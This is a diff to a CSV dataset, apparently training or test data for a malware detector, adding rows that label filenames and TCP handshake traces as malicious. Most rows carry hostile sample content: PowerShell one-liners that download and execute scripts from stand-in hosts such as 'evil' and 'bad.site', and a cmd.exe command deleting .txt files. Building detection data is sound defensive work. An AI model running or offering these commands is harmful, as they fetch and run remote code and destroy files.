@@ -48,6 +48,27 @@ be1f813e32ba827a.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malic
 3be77cde3fe49040.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
 0e568d2b934a35bb.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
 de1bdad68b7c98f3.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
+demo_payload.exe,SYN|SYN-ACK|ACK,true,Demo valid handshake for malicious filename and content,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
+mal1.exe,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
+mal2.scr,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
+mal3.bat,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
+mal4.vbs,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
+mal5.exe,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
+mal6.scr,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
+mal7.bat,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
+mal8.vbs,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
+mal9.exe,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
+mal10.scr,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
+mal11.bat,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
+mal12.vbs,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
+mal13.exe,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
+mal14.scr,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
+mal15.bat,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
+mal16.vbs,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
+mal17.exe,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
+mal18.scr,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
+mal19.bat,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
+mal20.vbs,SYN|SYN-ACK|ACK,true,Demo gated trace,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
 ad37834d05d013b5.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
 9cf3b652719ff5ae.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
 08dc47764b03b8cd.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
